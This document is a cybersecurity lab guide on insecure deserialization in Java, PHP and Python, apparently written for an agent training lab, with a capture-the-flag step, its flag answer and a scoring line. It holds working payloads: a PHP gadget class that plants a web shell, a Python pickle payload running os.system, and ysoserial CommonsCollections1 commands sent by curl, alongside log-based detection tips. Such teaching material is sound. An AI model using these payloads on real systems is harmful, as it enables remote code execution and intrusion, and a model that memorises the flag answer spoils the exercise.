---
name: detecting-insecure-deserialization-vulnerabilities
description: >-
  Detect insecure deserialization vulnerabilities in Java, Python (pickle), and
  PHP applications that allow remote code execution through crafted serialized
  objects. Covers gadget chain identification, ysoserial tool usage, and
  detection techniques in isolated lab environments. OWASP A08:2021.
domain: cybersecurity
subdomain: web-application-testing
tags: [deserialization, ysoserial, java, pickle, owasp-a08, advanced, rce, gadget-chains]
difficulty: advanced
mitre_techniques: [T1190, T1059]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/sqli-basics
---

> ⚠️ **Educational Use Only** — Deserialization exploits achieve Remote Code Execution (RCE). Practice exclusively in the provided isolated Docker lab. Never test deserialization exploits on systems you don't own — even test environments connected to production networks carry serious risk.

## When to Use

- During authorized Java or PHP web application pentests when serialized objects appear in cookies, headers, or POST bodies
- In CTF challenges with Java applications or binary-looking base64-encoded cookies
- When reviewing code for `ObjectInputStream.readObject()` (Java), `pickle.loads()` (Python), or `unserialize()` (PHP) calls on user-controlled input
- As a prerequisite for understanding gadget chain research and application-level RCE
- When auditing middleware (JBoss, WebLogic, Jenkins) that historically had deserialization CVEs

## Prerequisites

- **Knowledge:** Basic OOP concepts (what serialization is), familiarity with base64 encoding
- **Lab:** `labs/web-application/sqli-basics` (shared)
- **Difficulty:** Advanced — basic programming knowledge required
- **Time:** 50–70 minutes

## Workflow

### Step 1: Identify Serialized Data

Look for patterns that indicate serialized objects:

```bash
# Java serialized objects start with: AC ED 00 05 (hex) or rO0A (base64)
curl -I http://target:80/ | grep -i "Set-Cookie"
# Set-Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...

# PHP serialized strings look like:
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

# Python pickle (binary, often base64 encoded)
# Look for base64 blobs in cookies or hidden form fields
```

### Step 2: PHP Object Injection

If the app uses `unserialize()` on user-controlled data:

```php
// Vulnerable PHP code (lab contains this):
$data = unserialize(base64_decode($_COOKIE['user']));
```

Craft a malicious object:

```php
<?php
class User {
    public $role = "admin";
    public function __wakeup() {
        // Called on deserialization
    }
}

// Serialize and base64-encode
$obj = new User();
$obj->role = "admin";
echo base64_encode(serialize($obj));
// O:4:"User":1:{s:4:"role";s:5:"admin";}
```

If the class has a `__wakeup` or `__destruct` method with dangerous operations, full RCE may be achievable via:

```php
class Logger {
    public $log_file = "/var/www/html/shell.php";
    public $data = "<?php system(\$_GET['cmd']); ?>";
    public function __destruct() {
        file_put_contents($this->log_file, $this->data);
    }
}
```

### Step 3: Java Deserialization with ysoserial

ysoserial generates exploit payloads for vulnerable Java libraries:

```bash
# List available gadget chains
java -jar /lab/tools/ysoserial.jar

# Generate a payload for commons-collections (most common)
java -jar /lab/tools/ysoserial.jar CommonsCollections1 "id" | base64 > payload.b64

# Send to the vulnerable endpoint
curl -X POST http://target:8080/deserialize \
     -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @<(java -jar /lab/tools/ysoserial.jar CommonsCollections1 "id")
```

**In the lab:** The target outputs command results in the response. Outside the lab, commands run silently (blind RCE — use out-of-band techniques).

### Step 4: Python Pickle RCE

```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/output",))

# Serialize
payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

Send to the vulnerable endpoint:
```bash
curl -X POST http://target:8081/load \
     -d "data=$(python3 /lab/gen_pickle.py)"

# Check result (lab sandbox)
agentlab exec sqli-basics target cat /tmp/output
```

### Step 5: Detect via Log Analysis

Look for telltale signs of deserialization exploits in logs:

```bash
# Java deserialization attempts in access logs
grep "rO0" /var/log/nginx/access.log
grep "AC ED 00 05" /var/log/app.log

# Ysoserial payloads are large base64 blobs in cookies/params
awk 'length($0) > 500' /var/log/access.log | grep -i "cookie\|body"
```

### Step 6: Capture the Flag

The lab's Java endpoint is vulnerable to CommonsCollections1. Write the flag to a readable location:

```bash
java -jar /lab/tools/ysoserial.jar CommonsCollections1 \
     "cat /flag.txt > /tmp/flag_output" | \
     curl -X POST http://target:8080/api/deserialize \
     -H "Content-Type: application/octet-stream" \
     --data-binary @-

agentlab exec sqli-basics target cat /tmp/flag_output
# FLAG{java_deserialization_rce_achieved}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| Serialization | Converting an object to bytes for storage/transmission |
| Deserialization | Reconstructing an object from bytes — dangerous when input is untrusted |
| Gadget Chain | Sequence of existing class methods that, when deserialized, execute attacker-controlled code |
| ysoserial | Tool that generates Java deserialization payloads using known gadget chains |
| Magic Methods | PHP: `__wakeup`, `__destruct`, `__toString` — called automatically during deserialization |
| T1059 | MITRE ATT&CK: Command and Scripting Interpreter |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `ysoserial` | Java deserialization exploit generator | ✅ Pre-installed at /lab/tools/ |
| `PHP Generic Gadget Chains (PHPGGC)` | PHP deserialization payload generator | ✅ Pre-installed |
| `pickle` (Python stdlib) | Python serialization — can craft RCE payloads | ✅ Built-in |

## Output / Verification

```bash
agentlab verify sqli-basics "FLAG{java_deserialization_rce_achieved}"
```

**Score:** 200 points — highest difficulty bonus

## Further Reading

- [OWASP A08:2021 — Insecure Deserialization](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [PortSwigger Deserialization Labs](https://portswigger.net/web-security/deserialization)
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [PayloadsAllTheThings — Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/README.md)
